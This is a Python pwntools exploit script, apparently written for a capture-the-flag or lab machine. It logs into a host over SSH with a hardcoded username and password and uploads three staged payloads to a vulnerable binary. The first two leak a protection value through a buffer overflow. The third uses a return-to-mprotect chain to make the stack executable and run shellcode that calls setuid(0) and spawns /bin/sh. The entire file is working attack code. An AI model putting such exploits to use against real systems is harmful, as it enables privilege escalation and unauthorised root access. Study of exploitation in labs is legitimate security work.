import sys
import optparse
from pwn import *

context(arch = 'i386', os = 'linux')

def exploit(remote, shell):

    # Filename
    response = remote.recv(4096)
    print(response)

    #############  Step 1 - Send payload to get the hey.secret value  #############

    # Address = 0x80003068 - 0x8 - 0x68 = 0x80002ff8
    # (start of hey.struct minus 0x8 minus 0x68)
    # You need to get the hey.secret value that is -0x8 from where hey.sess is
    # plus -0x68 that gets added to the ebx register after the overflow 
    # This is stored in fileStep1 ("ABCDEFGH" + "0x80002ff8")
    ret = struct.pack("<I", 0x80002ff8)
    payload1 = "ABCDEFGH" + ret

    fileStep1 = '/tmp/bazuka/fileStep1'
    shell.upload_data(payload1, fileStep1)
    remote.send(fileStep1 + '\n')

    # Choose action 2
    response = remote.recv(4096)
    print(response)
    log.info("Sending action 2")
    remote.send('2 \n')

    # Read & Store hey.secret value
    response = remote.recv(4096)
    print response

    protect = int(response[13:22], 16)
    log.info("The protect value is " + hex(protect) + "\n")

    #############  Step 2 - Send payload to go to debug() #############

    # Choose action 4
    log.info("Sending action 4")
    remote.send('4 \n')

    # Filename
    response = remote.recv(4096)
    print(response)

    # |--protect--|--admin--|--return address--|
    # Right after the strncpy() in createusername(), EBX gets overflowed
    # So we control the EBX value 
    # 0x80004978 -0x68 -0xc = 0x80004904
    ret = struct.pack("<I", 0x80004904)
    protect = struct.pack("<I", protect)
    payload2 = protect + "AAAA" + ret

    fileStep2 = '/tmp/bazuka/fileStep2'
    shell.upload_data(payload2, fileStep2)
    remote.send(fileStep2 + '\n')

    # Choose action 3
    response = remote.recv(4096)
    print(response)
    log.info("Sending action 3")
    remote.send('3 \n')

    # Are we in debug?
    response = remote.recv(4096)
    print response

    #############  Step 3 - Exploit #############

    # Read and store the Vulnerable pointer location --- 0xbffffbf0
    vulnAddress = int(response[144:152], 16)
    print hex(vulnAddress)

    # shellcode = asm(shellcraft.execve("/bin/sh"))
    shellcode = asm(shellcraft.setuid(0) + shellcraft.execve("/bin/sh"))

    mprotectAddress = struct.pack("<I", 0xb7efcd50)	    	# mprotect() Address
    p1 = struct.pack("<I", 0xbfedf000)			        # Beginning of Stack
    p2 = struct.pack("<I", 0x121000)			        # 0xc0000000 - 0xbfedf000 = 0x121000
    p3 = struct.pack("<I", 0x7)				 	# Read, Write & Execute
    ret = struct.pack("<I", vulnAddress)		        # Return to the beginning of the buffer
    nops = (76 - len(shellcode)) * "\x90"

    # Return to debug() to see if stack is executable now
    # debug = struct.pack("<I", 0x80000c11)
    # payload3 = "A" * 76 + mprotectAddress + debug + p1 + p2 + p3 

    # Final payload
    payload3 =  shellcode + nops + mprotectAddress + ret + p1 + p2 + p3

    fileStep3 = '/tmp/bazuka/fileStep3'
    shell.upload_data(payload3, fileStep3)
    remote.send(fileStep3 + '\n')

    log.info("Exploit finished!\n")


parser = optparse.OptionParser()
parser.add_option('-t', '--target', dest="target", help="specify the target to connect to", default="10.10.10.27")
parser.add_option('-p', '--port', dest="port", help="specify the port to connect to", default=22)

options, args = parser.parse_args()

target = options.target
sshport = int(options.port)

# Connect to the SSH server
shell = ssh('xalvas', target, password='18547936..*', port=sshport)
shell.run('mkdir -p /tmp/bazuka')

# Upload the files/payloads we want
shell.upload('fileStep1', '/tmp/bazuka/fileStep1')
shell.upload('fileStep2', '/tmp/bazuka/fileStep2')
shell.upload('fileStep3', '/tmp/bazuka/fileStep3')

# Start a process on the server
binary = shell.process(['/home/xalvas/app/goodluck'])

print("\nTargeting: " + target + " (" + str(sshport) + ")")

exploit(binary, shell)
binary.interactive()
binary.close()
